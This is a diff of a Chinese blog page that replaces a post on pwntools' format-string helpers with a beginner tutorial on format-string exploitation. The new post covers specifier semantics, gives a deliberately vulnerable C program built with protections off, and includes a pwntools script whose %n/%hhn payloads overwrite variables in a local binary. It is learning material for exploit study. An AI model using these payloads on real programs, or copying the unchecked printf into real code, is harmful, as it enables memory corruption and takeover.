@@ -81,17 +81,21 @@
 
 
 
-<meta name="description" content="FmtStr的利用">
+<meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN——格式化字符FmtStr">
-<meta property="og:url" content="http://yoursite.com/2017/10/09/pwn6/index.html">
+<meta property="og:title" content="PWN_x86—3_fmt">
+<meta property="og:url" content="http://yoursite.com/2017/09/19/pwn3_fmt/index.html">
 <meta property="og:site_name" content="ESE&#39;s Note">
-<meta property="og:description" content="FmtStr的利用">
+<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-09T11:50:24.033Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg">
+<meta property="og:updated_time" content="2017-10-05T06:20:48.258Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN——格式化字符FmtStr">
-<meta name="twitter:description" content="FmtStr的利用">
+<meta name="twitter:title" content="PWN_x86—3_fmt">
+<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
 
 
 
@@ -121,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/10/09/pwn6/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/09/19/pwn3_fmt/"/>
 
 
 
 
 
-  <title>PWN——格式化字符FmtStr | ESE's Note</title>
+  <title>PWN_x86—3_fmt | ESE's Note</title>
   
 
 
@@ -254,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/09/pwn6/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/19/pwn3_fmt/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -271,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PWN——格式化字符FmtStr</h1>
+          <h1 class="post-title" itemprop="name headline">PWN_x86—3_fmt</h1>
         
 
         <div class="post-meta">
@@ -283,8 +287,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-09T13:57:26+08:00">
-                2017-10-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-19T18:08:08+08:00">
+                2017-09-19
               </time>
             
 
@@ -325,11 +329,16 @@
       
 
       
-        <p>FmtStr的利用<br><a id="more"></a></p>
-<h2 id="1、介绍fmt的函数"><a href="#1、介绍fmt的函数" class="headerlink" title="1、介绍fmt的函数"></a>1、介绍fmt的函数</h2><h3 id="FmtStr函数"><a href="#FmtStr函数" class="headerlink" title="FmtStr函数"></a>FmtStr函数</h3><p>FmtStr函数可以获取偏移参数的个数offset<br>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include&lt;stdio.h&gt;</span></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    char a[1024];</div><div class="line">    <span class="keyword">while</span>(1) </div><div class="line">    &#123;</div><div class="line">        memset(a, <span class="string">'\0'</span>, 1024);</div><div class="line">        <span class="built_in">read</span>(0, a, 1024);</div><div class="line">        <span class="built_in">printf</span>(a);</div><div class="line">        fflush(stdout);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>FmtStr函数利用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">    p = process(<span class="string">'./1'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="built_in">return</span> p.recv()</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line"><span class="built_in">print</span> autofmt.offset</div></pre></td></tr></table></figure></p>
-<p>结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># python 1.py </span></div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4859</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4861</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4863</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4865</div><div class="line">[*] Found format string offset: 4</div><div class="line">4</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4865)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4863)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4861)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4859)</div></pre></td></tr></table></figure></p>
-<h3 id="fmtstr-payload函数"><a href="#fmtstr-payload函数" class="headerlink" title="fmtstr_payload函数"></a>fmtstr_payload函数</h3><p>fmtstr_payload是pwntools提供的函数，用于自动生成格式化字符串。<br>fmtstr_payload有两个参数<br>第一个参数是int，用于表示取参数的偏移个数offset=7<br>第二个参数是字典，字典的意义是往key的地址，写入value的值<br><code>fmtstr_payload(7, {printf_got: system_add})</code><br>这个函数调用会往printf_got中写入system_add</p>
+        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p>
+<h1 id="PWN从开始到开始–格式化字符串"><a href="#PWN从开始到开始–格式化字符串" class="headerlink" title="PWN从开始到开始–格式化字符串"></a>PWN从开始到开始–格式化字符串</h1><a id="more"></a>
+<h2 id="1、格式化字符串"><a href="#1、格式化字符串" class="headerlink" title="1、格式化字符串"></a>1、格式化字符串</h2><p>函数:<br>int printf(const char *format, [argument]);<br>printf()函数的调用格式为: printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)。<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg" alt=""></p>
+<p>基本的格式化字符串参数<br>%c：输出字符，配上%n可用于向指定地址写数据。<br>%d：输出十进制整数，配上%n可用于向指定地址写数据。<br>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。<br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。<br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n (%100d10$n)表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
+<h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line">int a = 123, b = 456;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	int c = 789;</div><div class="line">	char s[100];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</div><div class="line">	scanf(<span class="string">"%s"</span>, s);</div><div class="line">	<span class="built_in">printf</span>(s);   //格式化，利用参数传递，打印出我们需要的地址</div><div class="line"><span class="keyword">if</span> (c == 16) </div><div class="line">&#123;</div><div class="line">	puts(<span class="string">"modified c."</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (a == 2) </div><div class="line">	&#123;</div><div class="line">	puts(<span class="string">"modified a for a small number."</span>);</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == 0x12345678)</div><div class="line">		&#123;</div><div class="line">			puts(<span class="string">"modified b for a big number!"</span>);</div><div class="line">		&#125;</div><div class="line">	<span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>生成文件<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o fmt fmt.c</code></p>
+<h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>ida调试,因为a，b都是全局变量，找到a,b的地址<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg" alt=""><br>gdb调试<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg" alt=""></p>
+<p>确定输入的是第6个参数</p>
+<h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">def ha():</div><div class="line">    p = process(<span class="string">'./fmt'</span>)</div><div class="line">    c_addr = int(p.recvuntil(<span class="string">'\n'</span>),16)</div><div class="line">    a_addr = 0x804A024</div><div class="line">    b_addr = 0x804A028</div><div class="line">    <span class="built_in">print</span> hex(c_addr)</div><div class="line">    raw_input()</div><div class="line">    payloadc = p32(c_addr)+<span class="string">'%12x'</span>+<span class="string">'%6$n'</span></div><div class="line">    payloada = <span class="string">'aa'</span>+<span class="string">'%8$n'</span>+<span class="string">'aa'</span>+p32(a_addr)</div><div class="line">    payloadb= p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+<span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></div><div class="line">    p.sendline(payloadb)</div><div class="line">    <span class="built_in">print</span> p.recv()</div><div class="line">    p.interactive()</div><div class="line">ha()</div></pre></td></tr></table></figure>
+<p>这个exp解释一下：%12x表示填充12个字节。特别payloada的时候，%8$n是字符输入的，所以占4个字节，所以地址是在第8个参数，但是输出不会打印出来，所以下面的构造payloadb时候，%x$n不算在字节。</p>
 
       
     </div>
@@ -369,8 +378,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/10/07/pwn2_me/" rel="next" title="PWN2_me">
-                <i class="fa fa-chevron-left"></i> PWN2_me
+              <a href="/2017/09/19/pwn2/" rel="next" title="PWN——CTF中的简单ret2blic">
+                <i class="fa fa-chevron-left"></i> PWN——CTF中的简单ret2blic
               </a>
             
           </div>
@@ -379,8 +388,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/10/09/pwn3_me/" rel="prev" title="PWN——格式化字符串利用">
-                PWN——格式化字符串利用 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/09/20/re_ctf_start/" rel="prev" title="RE_开始到开始">
+                RE_开始到开始 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -462,7 +471,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -584,7 +593,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、介绍fmt的函数"><span class="nav-number">1.</span> <span class="nav-text">1、介绍fmt的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FmtStr函数"><span class="nav-number">1.1.</span> <span class="nav-text">FmtStr函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmtstr-payload函数"><span class="nav-number">1.2.</span> <span class="nav-text">fmtstr_payload函数</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN从开始到开始–格式化字符串"><span class="nav-number">1.</span> <span class="nav-text">PWN从开始到开始–格式化字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、格式化字符串"><span class="nav-number">1.1.</span> <span class="nav-text">1、格式化字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、源码"><span class="nav-number">1.2.</span> <span class="nav-text">2、源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、分析"><span class="nav-number">1.3.</span> <span class="nav-text">3、分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、exp"><span class="nav-number">1.4.</span> <span class="nav-text">4、exp</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -628,7 +637,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共22.1k字</span>
+  <span class="post-count">博客全站共24.8k字</span>
 </div>
 
         
